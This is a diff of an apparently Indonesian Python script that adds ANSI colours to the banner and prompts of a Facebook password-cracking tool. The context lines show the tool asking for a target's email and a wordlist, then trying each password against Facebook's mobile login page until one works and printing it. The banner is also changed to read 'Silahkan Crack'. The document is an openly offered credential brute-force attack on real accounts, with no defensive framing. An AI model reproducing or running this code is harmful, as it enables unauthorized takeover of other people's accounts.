@@ -26,20 +26,20 @@ REAPER = ("""
     \033[36;1m================\033[35;1m=========================\033[36;1m==================
     \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mAuthor : Reza Alfauzan                    \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
     \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mgithub : Reaper-XD                        \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
-    \033[33;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mUntuk Password Dan Usernamenya Kalian     \033[36;1m[\033[33;1m*\033[36;1m]  \033[33;1m===
-    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mChat Saya Saja Di fb.com/reza123dcm       \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
-    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mJangan Recode Entar Error Bang            \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
+    \033[33;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mPesan  : Gunakanlah sc dengan bijak!!     \033[36;1m[\033[33;1m*\033[36;1m]  \033[33;1m===
+    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mPesan  : Karena Admin Tidak!!!            \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
+    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1m.......: Bertanggung Jawab!!              \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
     \033[36;1m===========================================================
     \033[33;1m>~>~>~>~>~>~>~>~>~>~>\033[35;1m~~~~~~~~~~~~~~~~\033[33;1m<~<~<~<~<~<~<~<~<~<~<~
-    \033[36;1m<\033[35;1m===================\033[33;1m[ \033[31;1mSilahkan Login \033[33;1m]\033[35;1m====================\033[36;1m>""")
+    \033[36;1m<\033[35;1m===================\033[33;1m[ \033[31;1mSilahkan Crack\033[33;1m]\033[35;1m====================\033[36;1m>""")
 #mulai
 os.system('xdg-open https://www.youtube.com/channel/UC5zJsltM9leQwjvYqrA_r5Q')
 os.system('clear')
 print(REAPER)
-print('[!]Masukkan Email Target\n')
-email = input("Email : ")
-print('Masukkan Wordlist(password.txt)')
-word = input('Wordlist : ')
+print('\033[37;1m[\033[31;1m!\033[37;1m]Masukkan Email Target\n')
+email = input("\033[31;1mEmail \033[37;1m: ")
+print('\033[37;1mMasukkan Wordlist\033[33;1m(\033[31;1mpassword.txt\033[33;1m)')
+word = input('\033[31;1mWordlist \033[37;1m: ')
 exist = os.path.isfile(word)
 if exist == False:
         print('\n[!]Masukkan Wordlists Yang Bener!!!!!')
@@ -47,7 +47,7 @@ else:
           url = 'https://m.facebook.com/login.php'
           os.system('clear')
           print(REAPER)
-          print('\n[!]Mulai Crack : '+ email)
+          print('\n\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1mMulai Crack \033[35;1m: '+ email)
           arq = open(word, 'r').readlines()
           for line in arq:
                 password = line.strip()
@@ -63,4 +63,4 @@ else:
                   print('[+] Password Adalah : '+password)
                   exit()
                 else:
-                  print('\n(-) Password Gagal Ditemukan : '+password)
+                  print('\n\033[31;1m(\033[37;1m-\033[31;1m) \033[37;1mPassword Gagal Ditemukan \033[31;1m: '+password)
